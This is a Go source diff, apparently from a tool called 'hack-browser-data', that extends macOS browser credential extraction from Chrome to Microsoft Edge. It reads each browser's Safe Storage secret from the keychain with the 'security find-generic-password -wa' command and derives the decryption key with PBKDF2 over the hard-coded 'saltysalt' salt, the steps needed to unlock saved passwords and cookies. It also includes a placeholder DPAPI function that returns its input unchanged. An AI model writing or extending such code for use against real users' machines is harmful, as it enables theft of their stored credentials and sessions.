@@ -8,28 +8,61 @@ import (
 	"errors"
 	"hack-browser-data/log"
 	"os/exec"
-	"path/filepath"
+	"strings"
 
 	"golang.org/x/crypto/pbkdf2"
 )
 
 const (
-	macChromeDir = "/Users/*/Library/Application Support/Google/Chrome/*/"
+	chromeDir    = "/Users/*/Library/Application Support/Google/Chrome/*/"
+	edgeDir      = "/Users/*/Library/Application Support/Microsoft Edge/*/"
+	mac360Secure = "/Users/*/Library/Application Support/360Chrome/*/"
+)
+
+const (
+	Chrome        = "Chrome"
+	Edge          = "Microsoft Edge"
+	SecureBrowser = "Chromium"
 )
 
 var (
-	iv         = []byte{32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32}
-	command    = []string{"security", "find-generic-password", "-wa", "Chrome"}
-	chromeSalt = []byte("saltysalt")
-	chromeKey  []byte
+	iv          = []byte{32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32}
+	command     = []string{"security", "find-generic-password", "-wa"}
+	chromeSalt  = []byte("saltysalt")
+	chromeKey   []byte
+	browserList = map[string]struct {
+		Dir     string
+		Command string
+	}{
+		"chrome": {
+			chromeDir,
+			Chrome,
+		},
+		"edge": {
+			edgeDir,
+			Edge,
+		},
+	}
 )
 
-func InitChromeKey() error {
+func DecryptStringWithDPAPI(data []byte) (string, error) {
+	return string(data), nil
+}
+
+func PickBrowser(name string) (browserDir, command string, err error) {
+	name = strings.ToLower(name)
+	if choice, ok := browserList[name]; ok {
+		return choice.Dir, choice.Command, err
+	}
+	return "", "", errBrowserNotSupported
+}
+
+func InitKey(key string) error {
 	var (
 		cmd            *exec.Cmd
 		stdout, stderr bytes.Buffer
 	)
-	cmd = exec.Command(command[0], command[1], command[2], command[3])
+	cmd = exec.Command(command[0], command[1], command[2], key)
 	cmd.Stdout = &stdout
 	cmd.Stderr = &stderr
 	err := cmd.Run()
@@ -47,20 +80,20 @@ func InitChromeKey() error {
 	return err
 }
 
-func GetDBPath(dbName ...string) (dbFile []string) {
-	for _, v := range dbName {
-		s, err := filepath.Glob(macChromeDir + v)
-		if err != nil && len(s) == 0 {
-			continue
-		}
-		if len(s) > 0 {
-			log.Debugf("Find %s File Success", v)
-			log.Debugf("%s file location is %s", v, s[0])
-			dbFile = append(dbFile, s[0])
-		}
-	}
-	return dbFile
-}
+//func GetDBPath(dir string, dbName ...string) (dbFile []string) {
+//	for _, v := range dbName {
+//		s, err := filepath.Glob(dir + v)
+//		if err != nil && len(s) == 0 {
+//			continue
+//		}
+//		if len(s) > 0 {
+//			log.Debugf("Find %s File Success", v)
+//			log.Debugf("%s file location is %s", v, s[0])
+//			dbFile = append(dbFile, s[0])
+//		}
+//	}
+//	return dbFile
+//}
 
 func decryptChromeKey(chromePass []byte) {
 	chromeKey = pbkdf2.Key(chromePass, chromeSalt, 1003, 16, sha1.New)
